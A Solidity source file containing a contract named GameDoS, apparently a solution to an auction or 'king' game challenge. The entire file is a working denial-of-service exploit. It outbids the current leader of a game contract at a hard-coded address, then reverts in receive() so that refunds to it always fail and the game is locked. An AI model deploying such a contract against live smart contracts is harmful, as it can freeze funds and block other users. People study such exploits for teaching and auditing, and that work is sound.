pragma solidity ^0.8.0;

interface IGame {
    function makeBid() external payable;
    function newBidEtherMin() external view returns (uint256);
}
contract GameDoS {
    IGame game = IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6);
    constructor() payable {
        uint256 cost = game.newBidEtherMin();
        game.makeBid{value: cost+1}();
        (bool success, ) = msg.sender.call{value:address(this).balance}("");
        require(success);
    }
    receive() external payable { revert("DoS");}
}
